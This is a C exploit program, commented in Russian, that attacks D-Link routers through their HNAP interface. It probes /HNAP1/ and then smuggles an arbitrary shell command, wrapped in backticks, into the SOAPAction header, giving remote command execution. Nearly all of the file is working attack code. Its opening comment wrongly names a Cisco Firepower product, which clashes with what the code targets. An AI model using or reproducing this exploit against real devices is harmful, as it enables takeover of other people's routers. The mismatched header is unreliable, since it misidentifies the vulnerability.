// "Cisco Firepower Management Console 6.0

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 4096

// Функция для отправки HTTP POST-запроса
int http_post(const char *target_ip, int port, const char *soap_action) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    int bytes_received;

    // Создание сокета
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Настройка адреса сервера
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Подключение к серверу
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Формирование HTTP POST-запроса
    snprintf(request, sizeof(request),
             "POST /HNAP1/ HTTP/1.1\r\n"
             "Host: %s\r\n"
             "SOAPAction: %s\r\n"
             "Content-Length: 0\r\n"
             "Connection: close\r\n"
             "\r\n", target_ip, soap_action);

    // Отправка запроса
    send(sock, request, strlen(request), 0);

    // Чтение ответа
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    response[bytes_received] = '\0'; // Завершение строки

    // Закрытие сокета
    close(sock);

    // Проверка на наличие "D-Link" и "SOAPActions" в ответе
    if (strstr(response, "D-Link") != NULL && strstr(response, "SOAPActions") != NULL) {
        return 1; // Уязвимо
    }

    return 0; // Не уязвимо
}

// Функция для выполнения команды
void execute_command(const char *target_ip, int port, const char *cmd) {
    char soap_action[BUFFER_SIZE];
    snprintf(soap_action, sizeof(soap_action), "\"http://purenetworks.com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && %s`\"", cmd);

    if (http_post(target_ip, port, soap_action) == 1) {
        printf("Command executed: %s\n", cmd);
    } else {
        printf("Failed to execute command.\n");
    }
}

// Основная функция
int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target_ip> <target_port> <command>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    const char *command = argv[3];

    if (http_post(target_ip, target_port, "\"http://purenetworks.com/HNAP1/GetDeviceSettings\"") == 1) {
        execute_command(target_ip, target_port, command);
    }

    return 0;
}
